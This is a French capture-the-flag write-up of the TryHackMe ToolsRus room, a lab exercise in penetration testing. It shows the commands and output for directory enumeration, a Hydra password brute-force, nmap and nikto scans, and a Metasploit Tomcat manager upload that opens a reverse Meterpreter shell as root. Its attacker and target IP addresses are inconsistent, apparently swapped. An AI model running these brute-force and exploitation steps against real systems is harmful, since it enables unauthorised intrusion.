# WriteUp : Salle ToolsRus

**Auteur :** [Axel-Cfr](https://github.com/Axel-Cfr)  
**Plateforme :** [TryHackMe](https://tryhackme.com/room/blue)  
**Difficulté :** Simple  
**Catégorie :** pwn  
**Outils utilisés :** Gobuster, Hydra, Nmap, Nikto, Metasploit

## Description de la salle

La salle nous fournit une machine d'attaque sous Ubuntu comprenant des outils integrés et un serveur web vulnérable. L'objectif est d'utiliser Gobuster, Hydra, Nmap, Nikto, Metasploit afin de trouver une faille exploitable, de prendre le contrôle de la machine vulnérable et d'y trouver des données potentiellement sensibles (ici le flag).

Adresse IP de la machine d'attaque : `10.130.169.119`  
Adresse IP de la machine vulnérable : `10.130.145.16`  

## Q1. What directory can you find, that begins with a "g" ?

Cherchons à énumérer les répertoires du serveur web ayant pour adresse 10.130.145.16.
```
gobuster dir -u http://10.130.145.16/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.130.145.16/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/guidelines           (Status: 301) [Size: 319] [--> http://10.130.145.16/guidelines/]
/protected            (Status: 401) [Size: 460]
/server-status        (Status: 403) [Size: 301]
Progress: 218275 / 218276 (100.00%)
===============================================================
Finished
===============================================================
```

Le répertoire du serveur web commençant par un 'g' est **`guidelines`**.

## Q2. Whose name can you find from this directory ?

En consultant la page à l'url http://10.130.145.16/guidelines/ depuis un navigateur, celle-ci affiche "**Hey bob, did you update that TomCat server?**".  
Donc le nom que le peut trouver depuis ce répertoire est **`bob`**.

## Q3. What directory has basic authentication ?

Parmis les autres répertoires trouvés avec gobuster, **`protected`** présente une authentification par identifiants et mots de passe.

## Q4. What is bob's password to the protected part of the website ?

Essayons de cracker le mot de passe de bob avec hydra et la liste rockyou.txt qui contient de nombreux mots de passe communs.
```
hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.130.145.16 http-get "/protected" -V
```
```
[...]
[ATTEMPT] target 10.130.145.16 - login "bob" - pass "hottie" - 62 of 14344398 [child 13] (0/0)
[80][http-get] host: 10.130.145.16   login: bob   password: bubbles
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-29 20:23:42
```
Le mot de passe de Bob pour la partie protégée de site web est **`bubbles`**.

Après s'être connecté, le site affiche le message :
```
This protected page has now moved to a different port.
```

## Q5. What other port that serves a webs service is open on the machine ?

Lançons un scan des ports de la machine sans compléter le three-way handshake afin de passer plus facilement inaperçu et en détectant les versions des serices utilisant les ports.

```
nmap -sS -sV 10.130.145.16
```
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-09-30 16:29 UTC
Nmap scan report for ip-10-130-145-16.eu-west-3.compute.internal (10.130.145.16)
Host is up (0.00011s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.19 seconds
```

Le port **`1234`** est utilisé par le service web Apache Tomcat/Coyote JSP engine 1.1 qui permet à une application ou à un système de communiquer avec des services web en utilisant le protocole http.

## Q6 What is the name and version of the software running on the port from question 5 ?

La version n'a pas l'air d'être trouvé avec -sV seulement donc relançons un scan avec -A.

```
nmap -sS -A -p 1234 10.130.145.16
```
```
[...]
PORT     STATE SERVICE VERSION
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/7.0.88
|_http-server-header: Apache-Coyote/1.1
[...]
```

Le nom et la version du logiciel tournant sur le port 1234 est : **`Apache Tomcat/7.0.88`**

## Q7. Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files are found ?

Lançons nikto en spécifiant le port et les identifiants.
```
nikto -h http://10.130.145.16/manager/html -p 1234 -id bob:bubbles
```
Malgré avoir spécifié le port, nikto scanne le port 80. Après quelques recherches complémentaires, lorsqu'un url est passé en paramètres, il faut mettre le numéro du port derrière l'addresse IP.
```
nikto -h http://10.130.145.16:1234/manager/html -id bob:bubbles
```
```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.130.145.16
+ Target Hostname:    ip-10-130-145-16.eu-west-3.compute.internal
+ Target Port:        1234
+ Start Time:         2026-09-30 19:17:28 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ Cookie JSESSIONID created without the httponly flag
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
+ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
+ /manager/html/manager/html: Default Tomcat Manager interface found
+ /manager/html/WorkArea/version.xml: Ektron CMS version information
+ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2026-09-30 19:17:37 (GMT0) (9 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested

```

On dénombre **`5`** fichiers de documentation différents pour 10 objets trouvés.

## Q8. What is the server version ?

Lors du scan accidentel du port 80 avec nikto, la version du serveur a bien été affichée. Relançons un scan du port 80 (port HTTP par défaut).
```
nikto -h http://10.130.145.16/manager/html
```
```
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.130.145.16
+ Target Hostname:    ip-10-130-145-16.eu-west-3.compute.internal
+ Target Port:        80
+ Start Time:         2026-09-30 19:35:05 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
[...]
```

La version du serveur est : **`Apache/2.4.18`**.

## Q9. What version of Apache-Coyote is this service using ?

Lors du scan sur le 1234, nous avons pu remarquer que la version d'Apache-Coyote utilisée est la **`1.1`**.

## Q10. Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as ?

J'ai des identifiants valides pour Tomcat manager donc nous allons essayer de trouver un exploit pour ce service.

```
msfconsole

msf > search type:exploit tomcat
[...]
   11  exploit/multi/http/tomcat_mgr_deploy                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   12    \_ target: Automatic                                                     .                .          .      .
   13    \_ target: Java Universal                                                .                .          .      .
   14    \_ target: Windows Universal                                             .                .          .      .
   15    \_ target: Linux x86                                                     .                .          .      .
   16  exploit/multi/http/tomcat_mgr_upload                                       2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   17    \_ target: Java Universal                                                .                .          .      .
   18    \_ target: Windows Universal                                             .                .          .      .
   19    \_ target: Linux x86                                                     .                .          .      .
[...]
```
Voici deux exploits qui pourraient être intéressants car ils demandent d'être authentifié, ce que l'on peut faire. Regardons de plus près.
```
msf > info 11
msf > info 16
```
Les deux sont très similaires; la seule différence est qu'ils uploadent le payload avec des types de requêtes différentes (PUT ou POST). Après quelques recherches, les deux méthodes permettent d'uploader correctement le payload. Essayons le premier.
```
msf > use 11
msf exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword bubbles
msf exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername bob
msf exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS 10.130.169.119
msf exploit(multi/http/tomcat_mgr_deploy) > set RPORT 1234
msf exploit(multi/http/tomcat_mgr_deploy) > check
[-] Failed: Error requesting /manager/serverinfo
[*] 10.130.169.119:1234 - Cannot reliably check exploitability. Could not connect to the target
```
Essayons l'autre exploit.
```
msf exploit(multi/http/tomcat_mgr_deploy) > back
msf > search type:exploit tomcat
msf > use 16
msf exploit(multi/http/tomcat_mgr_deploy) > set HttpPassword bubbles
msf exploit(multi/http/tomcat_mgr_deploy) > set HttpUsername bob
msf exploit(multi/http/tomcat_mgr_deploy) > set RHOSTS 10.130.169.119
msf exploit(multi/http/tomcat_mgr_deploy) > set RPORT 1234
msf exploit(multi/http/tomcat_mgr_deploy) > check
msf exploit(multi/http/tomcat_mgr_upload) > check
[+] 10.130.169.119:1234 - The target appears to be vulnerable. The target appears to be vulnerable based on the response
msf exploit(multi/http/tomcat_mgr_upload) > run
[*] Started reverse TCP handler on 10.130.145.16:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying V4Ab...
[*] Executing V4Ab...
[*] Undeploying V4Ab ...
[*] Sending stage (63221 bytes) to 10.130.169.119
[*] Undeployed at /manager/html/undeploy
[*] Meterpreter session 1 opened (10.130.145.16:4444 -> 10.130.169.119:44518) at 2026-10-02 15:47:13 +0000

meterpreter > getuid
Server username: root
```

J'ai obtenu un shell en tant qu'utilisateur **`root`**, donc avec les privilèges les plus élevés possibles.

What flag is found in the root directory ?

Cherchons le flag.
```
meterpreter > pwd
/
meterpreter > cd /root
meterpreter > ls
Listing: /root
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100667/rw-rw-rwx  47    fil   2019-03-11 16:06:14 +0000  .bash_history
100667/rw-rw-rwx  3106  fil   2015-10-22 17:15:21 +0000  .bashrc
040777/rwxrwxrwx  4096  dir   2019-03-11 15:30:33 +0000  .nano
100667/rw-rw-rwx  148   fil   2015-08-17 15:30:33 +0000  .profile
040777/rwxrwxrwx  4096  dir   2019-03-10 21:52:32 +0000  .ssh
100667/rw-rw-rwx  658   fil   2019-03-11 16:05:22 +0000  .viminfo
100666/rw-rw-rw-  33    fil   2019-03-11 16:05:22 +0000  flag.txt
040776/rwxrwxrw-  4096  dir   2019-03-10 21:52:43 +0000  snap

meterpreter > cat flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
```

## Conclusion

Cette salle m'a permis de réviser l'utilisation des outils tels que Gobuster, Hydra, Nmap, et Metasploit ainsi que d'apprendre à utiliser Nikto. De plus j'ai pu réflechir à quel exploit utiliser pour parvenir à mes fins en naviguant dans Metasploit et en faisant des recherches complémentaires.